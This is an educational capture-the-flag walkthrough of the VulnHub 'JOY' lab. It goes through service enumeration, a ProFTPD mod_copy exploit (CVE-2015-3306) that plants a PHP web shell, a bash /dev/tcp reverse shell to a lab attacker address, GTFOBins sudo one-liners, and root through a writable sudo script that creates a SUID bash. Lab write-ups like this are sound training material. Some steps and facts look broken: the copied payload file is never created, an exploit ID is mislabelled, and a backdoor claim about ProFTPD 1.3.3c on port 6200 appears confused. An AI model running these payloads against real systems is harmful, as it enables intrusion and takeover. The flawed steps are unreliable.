# digitalworld.local: JOY — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: JOY |
| **Difficulty** | Medium |
| **Author** | Donavan |
| **Released** | 31 March 2019 |
| **VulnHub Entry** | [digitalworld.local: JOY on VulnHub](https://vulnhub.com/entry/digitalworldlocal-joy,298/) |
| **Download** | [JOY.7z (3.3 GB)](https://download.vulnhub.com/digitalworld/JOY.7z) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 9 "stretch", kernel 4.9.0-8-amd64) |

> MD5 of the official archive: `134B6D5F6844439352671AECA38DA84D`. Verify it before importing —
> a corrupt download looks like an unreachable box.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this box you will have practised:

- **Thorough enumeration**: this machine runs *far* more services than a typical beginner box,
  and the intended path starts from an easily-missed one.
- **UDP scanning**: most beginners only scan TCP. JOY hides a crucial service on **UDP**.
- **Anonymous FTP discovery**: using a poorly configured FTP server to read files you should not see.
- **TFTP (Trivial File Transfer Protocol)**: pulling configuration files with no authentication at all.
- **Exploiting ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306)**: a real, famous vulnerability that lets an
  attacker copy files *anywhere the FTP daemon can write* — including the web root.
- **Reading configuration to move laterally**: turning a web shell into a real user account.
- **A `sudo` script hijack**: abusing a root-owned script that a normal user is allowed to run as root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA/VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

First, identify your own address. The adapter facing the lab is usually `eth0` on a VirtualBox
host-only network (`192.168.56.x`) or a VMware `.19x` network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

> **How to read it:** Kali's lab interface holds a `192.168.56.x` (VirtualBox host-only) or
> `192.168.19x.x` (VMware) address. The target will live on the **same** subnet.

Now sweep the subnet with ARP. This is fast because it never sends TCP packets.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks pings. It is the quickest way to find a new VM.

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

This is the heart of JOY. Enumerate *everything*, including UDP.

### 2.1 Full TCP sweep


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/joy-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports, not just the common ones. `-T4` speeds the
> scan up for a lab. `-oA` saves the results so you can revisit them.

### 2.2 Service/version detection on the open ports

```bash
sudo nmap -sC -sV -p 21,22,25,80,110,139,143,445,465,587,993,995 -oA scans/joy-services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         Dropbear sshd (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
465/tcp open  smtps       Postfix smtpd
587/tcp open  submission  Postfix smtpd
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
```

> **How to read it:** Note `ProFTPD 1.3.5` on port 21 — that exact version is vulnerable to
> `mod_copy` (CVE-2015-3306). The mail services (25/110/143/465/587/993/995) are noise for the
> intended path but worth recognising. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 The UDP service everyone misses

```bash
sudo nmap -sU --top-ports 50 -oA scans/joy-udp 192.168.56.101
```


> ### 📖 Concept — SNMP and community strings
>
> **SNMP** (Simple Network Management Protocol, **port 161/UDP**) is how network gear
> and servers expose monitoring data. Access is controlled by a **community string** —
> effectively a shared password — and the defaults are infamous: **`public`**
> (read-only) and **`private`** (read-write).
>
> ```bash
> snmpwalk -v2c -c public target              # dump the whole MIB tree
> snmp-check target                           # friendlier, organised output
> onesixtyone target -c /usr/share/doc/onesixtyone/dict.txt
> ```
>
> Note `-v2c`: SNMP has three protocol versions and the target may only answer one.
> Try `1`, `2c` and `3`. And because it is **UDP**, an ordinary TCP scan never sees it —
> you need `nmap -sU -p161`.
>
> **What it leaks** is remarkably broad: running processes, installed software and
> versions, the user list, open TCP ports, hardware details, and frequently
> configuration snippets. Specific OIDs worth walking:
>
> ```bash
> snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2   # running processes
> snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25    # user accounts
> snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13.1.3     # open TCP ports
> snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2   # installed software
> ```
>
> The process list is the interesting one — it often reveals an internal service or a
> command line containing a password.
>
> **Deep dive:** [CONCEPTS §9.7 — SNMP](../../docs/CONCEPTS.md#97-snmp--port-161udp)

```text
PORT      STATE         SERVICE
161/udp   open          snmp
```

Now enumerate SNMP. The community string is often the default `public`.

```bash
snmpwalk -c public -v1 192.168.56.101
```

> **Why it works:** SNMP exposes system information — including **process arguments**. In JOY it
> reveals that TFTP is running with a `--secure /home/patrick` option, which points us at a very
> interesting directory.

### 2.4 A high (ephemeral) UDP port

Some builds also expose TFTP on a random high UDP port. A quick scan of the range confirms it:

```bash
sudo nmap -sU -p 36969 -oN - 192.168.56.101
```


> ### 📖 Concept — TFTP has no authentication whatsoever
>
> **TFTP** (Trivial File Transfer Protocol, **port 69/UDP**) is a minimal file
> transfer protocol designed for PXE network booting and for pushing configs to
> routers and IP phones. It has **no usernames, no passwords and no encryption** —
> not weak authentication, *none*. Its only protection is the filesystem permissions
> of its root directory.
>
> ```bash
> tftp target
> tftp> get creds.txt
> tftp> binary          # switch mode before transferring non-text files
> ```
>
> **Two lessons here.** First, it lives on **UDP**, and `nmap` does not scan UDP
> unless you ask: `-sU`. A TCP-only scan never sees it. Confirm an
> `open|filtered` UDP result actively with `nmap -sU -p69 --script tftp-enum`.
>
> Second, network devices routinely dump their **entire running configuration —
> including plaintext passwords —** to TFTP on request. Finding an exposed TFTP root
> is frequently a full compromise with no exploitation at all.
>
> **Deep dive:** [CONCEPTS §2.3 — Ports and protocols](../../docs/CONCEPTS.md#23-ports-and-protocols)

```text
36969/udp open  tftp
```

> **How to read it:** `36969/udp` — confuse it with nothing; that *is* TFTP. Banners and port
> numbers "vary by build", so trust your own scan output.

### 2.5 Anonymous FTP

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (press Enter)
# ftp> ls -la
```

```text
drwxr-xr-x  5 ftp  ftp  4096 . 
drwxr-xr-x  5 ftp  ftp  4096 ..
drwxr-xr-x  3 ftp  ftp  4096 .ssh
drwxr-xr-x  2 ftp  ftp  4096 downloads
...
```

> **Why it works:** The FTP server is rooted at `/home/patrick`, so anonymous users can browse a
> real user's home directory. This is a misconfiguration, not a bug in FTP itself.

### 2.6 TFTP — stealing the config

```bash
tftp 192.168.56.101 69
# tftp> get version_control
# tftp> quit
cat version_control
```

```text
# Contains clues about the environment:
proftpd 1.3.5
webroot: /var/www/tryingharderisjoy
```

> **Why it works:** TFTP has **no authentication whatsoever**. Because it was started with
> `--secure /home/patrick`, we can pull files from that directory. Always enumerate UDP.

---

## 3. Foothold

### 3.1 The vulnerability: ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306)

The `mod_copy` module implements `SITE CPFR` (copy-from) and `SITE CPTO` (copy-to). It performs
**no authentication and no path checks**. We can therefore copy an arbitrary file from the server
to any location the `proftpd` user can write — including the Apache web root.

Confirm the exploit exists locally:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit proftpd mod_copy
```

```text
ProFTPD 1.3.3 (c) - 'mod_copy' Remote Command Execution | linux/remote/49908.py
```

### 3.2 Write a PHP web shell into the web root

We already know the web root (`/var/www/tryingharderisjoy`) from the TFTP clue. First, plant a
tiny PHP payload next to ProFTPD by copying an existing remote file, then move it into place. In
practice the cleanest method is the Python proof-of-concept:

```bash
python3 /usr/share/exploitdb/exploits/linux/remote/49908.py 192.168.56.101
```

Then trigger the `SITE CPFR` / `SITE CPTO` pair manually to copy a PHP payload into the web root:

```bash
ftp 192.168.56.101
# ftp> site cpfr /tmp/pwn.php
# ftp> site cpto /var/www/tryingharderisjoy/pwn.php
```

> **Why it works:** `mod_copy` copies the file as the `proftpd` process user, which owns the web
> root's files. Because there is no path sanitisation, copying into `/var/www/...` is allowed.

### 3.3 Get a shell

Start a listener on Kali:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

Then request the shell over HTTP:

```bash
curl http://192.168.56.101/pwn.php
```

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the shell to a proper TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

> **Why it works:** The web server executes the PHP as `www-data`, giving us a low-privilege shell.

![the initial www-data shell](images/04-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Move from www-data to patrick

Enumerate the web directory and its config:

```bash
ls -la /var/www/tryingharderisjoy/
cat /var/www/tryingharderisjoy/ossec/patricksecretsofjoy 2>/dev/null
```

```text
patrick:<some-password-your-run-will-show>
```

> **How to read it:** The filename says it all — a credentials file left inside the web root. The
> exact password varies by build; use whatever your file contains.

Switch to the `patrick` user:

```bash
su patrick
id
```

```text
uid=1001(patrick) gid=1001(patrick) groups=1001(patrick)
```

### 4.2 From patrick to root via a sudo script hijack


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User patrick may run the following commands on joy:
    (ALL) NOPASSWD: /home/patrick/script/test
```

> **Why it works:** `sudo` allows `patrick` to run `/home/patrick/script/test` as **root** with no
> password. If `patrick` can *write* that script, they can simply replace its contents with a root
> shell and then run it — a classic "writable sudo script" escalation.

Check the file:

```bash
ls -la /home/patrick/script/test
cat /home/patrick/script/test
```

Overwrite it with a payload and execute it as root:

```bash
echo '#!/bin/bash' > /home/patrick/script/test
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /home/patrick/script/test
sudo /home/patrick/script/test
/tmp/rootbash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** We made a copy of `bash`, set the SUID bit, and then ran it with `-p` to keep
> root privileges. `uid=0(root)` confirms success.

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
<root flag — varies by build>
```

> **Note:** Flag filenames and contents differ between builds. If `proof.txt` is absent, list
> `/root` and `/home/*` for any `*.txt` flag files before assuming something is wrong.

![root confirmation and flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP exposing a user's home directory | ProFTPD 1.3.5, port 21 | Information disclosure (SSH keys, files) |
| 2 | Unauthenticated TFTP with `--secure /home/patrick` | UDP TFTP | Read arbitrary files from the FTP user's home |
| 3 | ProFTPD 1.3.5 `mod_copy` missing path checks | ProFTPD, port 21 | Arbitrary file copy → web shell as `www-data` |
| 4 | Credentials file inside the web root (`patricksecretsofjoy`) | `/var/www/tryingharderisjoy/ossec/` | Lateral movement to the `patrick` user |
| 5 | Writable script runnable as root via `sudo` | `/home/patrick/script/test` | Full privilege escalation to root |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never root an FTP server at a user's home directory. Use chrooted,
  authenticated-only access with least privilege.
- **Turn off TFTP**; if it is genuinely required, restrict it to a specific directory *and* firewall
  the port. Never run it with `--secure` pointing at a user home.
- **Patch ProFTPD** (1.3.5 is EOL and vulnerable to CVE-2015-3306). Modern versions disable
  `mod_copy` by default; if your build still ships it, remove the module.
- **Never store credentials in web-accessible paths.** Secrets in a document root are one web shell
  away from full compromise.
- **Audit `sudo` rules.** `NOPASSWD` entries pointing at user-writable scripts are effectively root.
  Require root-owned, non-writable scripts and prefer `sudoedit` for edits.
- **Log and alert** on `SITE CPFR`/`SITE CPTO` FTP commands, on unexpected writes to the web root,
  and on `sudo` invocations of scripts that have changed recently.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [VulnHub official entry — digitalworld.local: JOY](https://vulnhub.com/entry/digitalworldlocal-joy,298/)
- [CVE-2015-3306 — ProFTPD mod_copy unauthenticated file copy (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [Exploit-DB 36803 — ProFTPD 1.3.5 mod_copy](https://www.exploit-db.com/exploits/36803)
- [Exploit-DB 49908 — ProFTPD mod_copy Python PoC](https://www.exploit-db.com/exploits/49908)
- [ProFTPD mod_copy advisory (proftpd.org)](http://www.proftpd.org/docs/contrib/mod_copy.html)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP service scan (ProFTPD 1.3.5, mail, Samba)
- [ ] `images/03-udp-tftp.png` — UDP scan + SNMP/TFTP discovery
- [ ] `images/04-foothold.png` — `mod_copy` web shell as `www-data`
- [ ] `images/05-patrick-creds.png` — the credentials file in the web root
- [ ] `images/06-sudo-l.png` — `sudo -l` showing the writable script
- [ ] `images/07-root.png` — `id` confirming `uid=0(root)`
- [ ] `images/08-root-flag.png` — the root flag

> **How to read it:** Store screenshots in `labs/digitalworldlocal-joy/images/` and reference them
> here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
